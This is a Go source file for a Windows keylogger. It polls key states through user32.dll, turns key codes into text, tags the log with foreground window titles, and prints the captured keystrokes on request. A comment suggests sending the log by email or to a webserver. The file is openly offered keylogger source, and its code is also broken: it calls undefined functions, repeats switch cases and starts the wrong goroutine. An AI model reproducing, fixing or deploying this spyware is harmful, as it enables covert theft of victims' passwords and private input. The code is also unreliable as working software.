package main

import (
	"fmt"
	"os"
	"syscall"
	"time"

	"github.com/TheTitanrain/w32"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")    //Get key pressed state
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //Adding get foreground window API to the environment
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //Adding get window title API to the environment

	tempKeyLog string
	tempTitle  string
)

//GetForegroundWindow - > HWND = PID
func GetActiveWindow() (hwnd syscall.Handle, err error) {

	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}

	hwnd = syscall.Handle(r0)
	return
}

//Get window title
func GetWindowTitle() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

//Determines whether a key is up or down when the fuction is called, and whether the key was pressed after a previous call to GetAsyncKeyState
func KeyLogging() {

	for {

		time.Sleep(1 * time.Millisecond)

		for KEY := 0; KEY <= 256; KEY++ {

			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))

			if int(Val) == -32767 {

				switch KEY {
				case w32.VK_LCONTROL:
					tempKeyLog += "[LeftCtrl]"
				case w32.VK_RCONTROL:
					tempKeyLog += "[RightCtrl]"
				case w32.VK_BACK:
					tempKeyLog += "[Back]"
				case w32.VK_TAB:
					tempKeyLog += "[Tab]"
				case w32.VK_F1:
					tempKeyLog += "[F1]"
				case w32.VK_F2:
					tempKeyLog += "[F2]"
				case w32.VK_F3:
					tempKeyLog += "[F3]"
				case w32.VK_F4:
					tempKeyLog += "[F4]"
				case w32.VK_F5:
					tempKeyLog += "[F5]"
				case w32.VK_F6:
					tempKeyLog += "[F6]"
				case w32.VK_F7:
					tempKeyLog += "[F7]"
				case w32.VK_F8:
					tempKeyLog += "[F8]"
				case w32.VK_F9:
					tempKeyLog += "[F9]"
				case w32.VK_F10:
					tempKeyLog += "[F10]"
				case w32.VK_F11:
					tempKeyLog += "[F11]"
				case w32.VK_F12:
					tempKeyLog += "[F12]"
				case w32.VK_NUMLOCK:
					tempKeyLog += "[NumLock]"
				case w32.VK_SCROLL:
					tempKeyLog += "[ScrollLock]"
				case w32.VK_LSHIFT:
					tempKeyLog += "[LeftShift]"
				case w32.VK_RSHIFT:
					tempKeyLog += "[RightShift]"
				case w32.VK_LMENU:
					tempKeyLog += "[LeftMenu]"
				case w32.VK_RMENU:
					tempKeyLog += "[RightMenu]"
				case w32.VK_DELETE:
					tempKeyLog += "[Delete]"
				case w32.VK_INSERT:
					tempKeyLog += "[Insert]"
				case w32.VK_HOME:
					tempKeyLog += "[Home]"
				case w32.VK_END:
					tempKeyLog += "[End]"
				case w32.VK_CAPITAL:
					tempKeyLog += "[CapsLock]"
				case w32.VK_ESCAPE:
					tempKeyLog += "[Esc]"
				case w32.VK_LBUTTON:
					tempKeyLog += "[LeftMouse]"
				case w32.VK_RBUTTON:
					tempKeyLog += "[RightMouse]"
				case w32.VK_MBUTTON:
					tempKeyLog += "[MiddleMouse]"
				case w32.VK_RETURN:
					tempKeyLog += "[Enter]"
				case w32.VK_SPACE:
					tempKeyLog += "[Space]"
				case w32.VK_PRIOR:
					tempKeyLog += "[PgUp]"
				case w32.VK_NEXT:
					tempKeyLog += "[PgDn]"
				case w32.VK_DOWN:
					tempKeyLog += "[DownArrow]"
				case w32.VK_RIGHT:
					tempKeyLog += "[RightArrow]"
				case w32.VK_UP:
					tempKeyLog += "[UpArrow]"
				case w32.VK_LEFT:
					tempKeyLog += "[LeftArrow]"
				case w32.VK_SNAPSHOT:
					tempKeyLog += "[PrtSc]"
				case w32.VK_LWIN:
					tempKeyLog += "[LSuper]"
				case w32.VK_RWIN:
					tempKeyLog += "[RSuper]"
				case w32.VK_NUMPAD0:
					tempKeyLog += "[Num0]"
				case w32.VK_NUMPAD01:
					tempKeyLog += "[Num1]"
				case w32.VK_NUMPAD2:
					tempKeyLog += "[Num2]"
				case w32.VK_NUMPAD3:
					tempKeyLog += "[Num3]"
				case w32.VK_NUMPAD4:
					tempKeyLog += "[Num4]"
				case w32.VK_NUMPAD5:
					tempKeyLog += "[Num5]"
				case w32.VK_NUMPAD6:
					tempKeyLog += "[Num6]"
				case w32.VK_NUMPAD7:
					tempKeyLog += "[Num7]"
				case w32.VK_NUMPAD8:
					tempKeyLog += "[Num8]"
				case w32.VK_NUMPAD9:
					tempKeyLog += "[Num9]"
				case w32.VK_MULTIPLY:
					tempKeyLog += "*"
				case w32.VK_ADD:
					tempKeyLog += "+"
				case w32.VK_SEPARATOR:
					tempKeyLog += "|"
				case w32.VK_SUBTRACT:
					tempKeyLog += "-"
				case w32.VK_DECIMAL:
					tempKeyLog += "."
				case w32.VK_DIVIDE:
					tempKeyLog += "/"
				case w32.VK_LMENU:
					tempKeyLog += "[LMenu]"
				case w32.VK_RMENU:
					tempKeyLog += "[RMenu]"
				case w32.VK_OEM_1:
					tempKeyLog += ";"
				case w32.VK_OEM_2:
					tempKeyLog += "/"
				case w32.VK_OEM_3:
					tempKeyLog += "`"
				case w32.VK_OEM_4:
					tempKeyLog += "["
				case w32.VK_OEM_5:
					tempKeyLog += "\\"
				case w32.VK_OEM_6:
					tempKeyLog += "]"
				case w32.VK_OEM_7:
					tempKeyLog += "'"
				case w32.VK_PERIOD:
					tempKeyLog += "."
				case 0x30:
					tempKeyLog += "0"
				case 0x31:
					tempKeyLog += "1"
				case 0x32:
					tempKeyLog += "2"
				case 0x33:
					tempKeyLog += "3"
				case 0x34:
					tempKeyLog += "4"
				case 0x35:
					tempKeyLog += "5"
				case 0x36:
					tempKeyLog += "6"
				case 0x37:
					tempKeyLog += "7"
				case 0x38:
					tempKeyLog += "8"
				case 0x39:
					tempKeyLog += "9"
				case 0x41:
					tempKeyLog += "a"
				case 0x42:
					tempKeyLog += "b"
				case 0x43:
					tempKeyLog += "c"
				case 0x44:
					tempKeyLog += "d"
				case 0x45:
					tempKeyLog += "e"
				case 0x46:
					tempKeyLog += "f"
				case 0x47:
					tempKeyLog += "g"
				case 0x48:
					tempKeyLog += "h"
				case 0x49:
					tempKeyLog += "i"
				case 0x4A:
					tempKeyLog += "j"
				case 0x4B:
					tempKeyLog += "k"
				case 0x4C:
					tempKeyLog += "l"
				case 0x4D:
					tempKeyLog += "m"
				case 0x4E:
					tempKeyLog += "n"
				case 0x4F:
					tempKeyLog += "o"
				case 0x50:
					tempKeyLog += "p"
				case 0x51:
					tempKeyLog += "q"
				case 0x52:
					tempKeyLog += "r"
				case 0x53:
					tempKeyLog += "s"
				case 0x54:
					tempKeyLog += "t"
				case 0x55:
					tempKeyLog += "u"
				case 0x56:
					tempKeyLog += "v"
				case 0x57:
					tempKeyLog += "w"
				case 0x58:
					tempKeyLog += "x"
				case 0x59:
					tempKeyLog += "y"
				case 0x5A:
					tempKeyLog += "z"
				}

			}
		}

	}
}

func WindowLogger() {

	for {

		g, _ := getActiveWindow()
		b := make([]uint16, 200)

		_, err := getWindowTitle(g, &b[0], int32(len(b)))

		if err != nil {
		}

		if syscall.UTF16ToString(b) != "" {
			if tempTitle != syscall.UTF16ToString(b) {
				tempTitle = syscall.UTF16ToString(b)
				tempKeyLog += string("{" + syscall.UTF16ToString(b) + "}\r\n")
			}
		}
		time.Sleep(1 * time.Millisecond)

	}
}

func main() {

	fmt.Println("Keylogger Started :^)")
	go KeyLogging()
	go GetWindowTitle()

	fmt.Println("Press Enter to show logs.\n")
	os.Stdin.Read([]byte{0})
	fmt.Println(tempKeyLog) //Change this to preferred form of logging i.e. saved file, email, webserver etc.

	os.Stdin.Read([]byte{0})
}
